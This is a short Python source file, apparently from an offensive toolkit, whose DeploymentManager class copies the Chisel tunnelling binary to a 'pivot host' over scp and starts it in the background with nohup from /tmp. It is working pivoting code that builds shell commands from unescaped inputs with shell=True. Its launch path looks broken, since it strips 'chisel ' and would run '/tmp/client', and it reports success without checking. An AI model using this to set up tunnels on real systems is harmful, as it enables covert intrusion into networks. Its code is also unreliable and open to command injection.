import subprocess
import time


class DeploymentManager:
    """Deploy Chisel to pivot hosts"""

    @staticmethod
    def deploy_and_start(pivot_ip, pivot_user, pivot_key, chisel_binary, client_cmd):
        print(f"\n[*] Deploying to {pivot_user}@{pivot_ip}...")

        # Copy binary
        scp_cmd = f"scp -i {pivot_key} {chisel_binary} {pivot_user}@{pivot_ip}:/tmp/chisel"
        result = subprocess.run(scp_cmd, shell=True, capture_output=True)
        if result.returncode != 0:
            print(f"[-] Deploy failed")
            return False

        # Make executable and run
        ssh_cmd = f"ssh -i {pivot_key} {pivot_user}@{pivot_ip} 'chmod +x /tmp/chisel && nohup /tmp/{client_cmd.replace('chisel ', '')} > /tmp/chisel.log 2>&1 &'"
        subprocess.run(ssh_cmd, shell=True)
        time.sleep(2)

        print(f"[+] Deployed successfully!")
        return True